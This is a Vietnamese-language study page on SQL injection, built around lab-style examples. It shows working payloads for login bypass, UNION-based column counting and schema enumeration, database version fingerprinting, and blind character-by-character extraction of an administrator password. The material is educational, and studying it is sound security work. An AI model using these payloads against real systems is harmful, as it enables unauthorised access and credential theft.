<h1>SQL Injection</h1>
<p>Tổng hợp phần lí thuyết.</p>

<h2>1. SQL Injection</h2>
<h3>1.1. Phát hiện SQLi</h3>
<p>Muốn biết ứng dụng có bị SQL Injection hay không, ta thử gửi những loại input đặc biệt vào tất cả các chỗ nhập liệu (form, URL, search box...) - gọi là <i>inject point</i>.</p>
<p>Dưới đây là các cách kiểm tra phổ biến:<br><i>(lưu ý, mỗi loại SQL server sẽ có syntax SQL khác nhau)</i></p>
<table>
  <tr>
    <th>Cách kiểm tra</th>
    <th>Dấu hiệu có SQLi</th>
  </tr>
  <tr>
    <td>Thử dấu nháy đơn <code>'</code></td>
    <td>Lỗi SQL (syntax error,...) hoặc phản hồi khác thường.</td>
  </tr>
  <tr>
    <td>Thử cú pháp SQL đặc biệt</td>
    <td>Ví dụ nếu ta thử <code>id=10</code>và <code>id=10+1</code> mà ra cùng kết quả.</td>
  </tr>
  <tr>
    <td>Thử điều kiện Boolean (TRUE/FALSE)</td>
    <td><code>OR 1=1</code> -> trả nhiều dữ liệu hơn (hoặc login bypass).</td>
  </tr>
  <tr>
    <td>Time-based SQLi</td>
    <td><code>'; SLEEP(5); --</code> -> Server phản hồi chậm đúng 5s.</td>
  </tr>
  <tr>
    <td>OAST payload (Out-of-band SQLi)</td>
    <td>Gửi payload khiến server phải gửi một request ra ngoài (ví dụ tới Burp Collaborator), và nhận được request từ server.</td>
  </tr>
  <tr>
    <td>Burp Scanner (Pro)</td>
    <td></td>
  </tr>
</table>

  <h3>1.2. Retrieving hidden data</h3>
  <p><b>Bối cảnh:</b> Web dùng URL nhận category từ user</p>
  <pre>https://insecure-website.com/products?category=Gifts</pre>
  <p> và dùng câu SQL sau kiểm tra các sản phẩm đã được phát hành (<code>released=1</code>). Nếu sản phẩm chưa được phát hành thì bị ẩn đi (<code>release=0</code>).</p>
  <pre>SELECT * FROM products 
WHERE category = 'Gifts' AND released = 1;</pre>
  <p>Nếu muốn xem những sản phẩm có <code>released = 0</code> (hoặc tất cả), ta nhập payload sau vào URL:</p>
  <pre>...category=Gifts' or 1=1;--</pre>
  <p>SQL trở thành:</p>
  <pre>SELECT * FROM products 
WHERE category = 'Gifts' or 1=1;--' AND released = 1;</pre>
  <p>Phần sau <code>--</code>: <code>' AND released = 1;</code> bị biến thành comment.</p>

  <h3>1.3. Simple Login Bypass</h3>
  <p><b>Bối cảnh:</b> Web sử dụng câu query sau để kiểm tra username và password của user.</p>
  <pre>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'</pre>
  <p>Nếu muốn log in as admin ta có thể inject vào username như sau:</p>
  <pre>SELECT * FROM users WHERE username = '<b>administrator'--</b>' AND password = 'bluecheese'</pre>
  <p>Khi đó phần query kiểm tra pass phía sau <code>' AND password = ''</code> sẽ bị vô hiệu hóa.</p>


<h2>2. UNION-based SQLi</h2>
<p>Để tiếp tục hack 1 cách "tinh vi" hơn, ta cần làm query phức tạp hơn - sử dụng UNION clause.</p>
<p>Nhưng, UNION clause lại cần 1 điều kiện: 2 vế SELECT phải select cùng số cột với nhau như minh họa:
<pre>SELECT a,b FROM table1 UNION SELECT c,d FROM table2</pre>
<p>Vậy nên bước đầu tiên là xác định số cột của SQL query.</p>

  <h3>2.1. Xác định số cột</h3>
  <p>Ta sẽ đoán mò bằng cách UNION với các cột NULL:</p>
  <pre>' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
...</pre>
  <p><strong>Oracle</strong></p>
<pre>' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT NULL,NULL,NULL FROM DUAL--
...</pre>

<h3>2.2. Xác định loại database và version</h3>
<p>Mỗi loại database có syntax khác nhau, vậy nên sẽ có payload khác nhau:</p>
<p><strong>Microsoft, MySQL</strong>: <code>' union select @@version</code></p>
<p><strong>Oracle</strong>: <code>' union select v$version</code></p>
<p><strong>PostgreSQL</strong>: <code>' union select version()</code></p>

<h3>2.3. Xác định tên bảng và cột</h3>
<p>Lưu ý mỗi database có 1 syntax nên payload sẽ thay đổi 1 xíu dựa trên loại database</p>
<p><strong>Non-Oracle:</strong></p>
<p><strong>Payload tên bảng</strong>:</p>
<pre>' union select null, table_name from information_schema.tables--</pre>
<p><strong>Payload tên cột</strong>:</p>
<pre>' union select null, column_name from information_schema.columns where table_name='users'--</pre>

<h2>3. Blind SQLi</h2>
<p>Blind SQL Injection: web bị SQLi nhưng kết quả truy vấn không hiển thị ra giao diện, hoặc không có lỗi SQL hiện ra. <br>Ta chỉ có thể thấy server phản hồi khác nhau khi điều kiện SQL đúng hoặc sai.</p>
<p>Vì không thấy dữ liệu nên UNION SELECT không dùng được.<br>Ta sẽ tạo ra điều kiện đúng/sai để quan sát sự khác biệt trong phản hồi (ví dụ: có/không có "Welcome back").</p>
<p><b>Bối cảnh:</b></p>
<ul>
  <li>Web có cookie: <code>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</code></li>
  <li>Server chạy truy vấn:
    <pre>SELECT TrackingId FROM TrackedUsers 
WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'</pre></li>
  <li>Nếu có trong DB thì hiện “Welcome back”.</li>
</ul>
<p>Giờ ta thử chèn: <code>xyz' AND '1'='1</code>.</p>
<p>SQL trở thành:</p>
<pre>SELECT TrackingId FROM TrackedUsers 
WHERE TrackingId = '<b>xyz' AND '1'='1</b>'</pre>
<p>'1'='1' luôn đúng -> TRUE -> "Welcome back"</p>
<p>Áp dụng điều này ta sẽ trích xuất username và password.</p>
<p><b>Payload</b>:</p>
<pre>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 'm</pre>
<ul>
  <li>Do Blind-SQLi không trả về dữ liệu nên không thể dùng UNION SELECT.</li>
  <li>Thay vào đó ta sẽ trích xuất từng kí tự để so sánh - dùng hàm <code>substring([string], [start], [length])</code></li>
  <li>Nếu Welcome back → nghĩa là ký tự đầu > <code>'m'</code>. Nếu không → ký tự đầu ≤ <code>'m'</code></li>
</ul>
<p>Lặp lại bước trên cho đến khi ta tìm được toàn bộ password.</p>

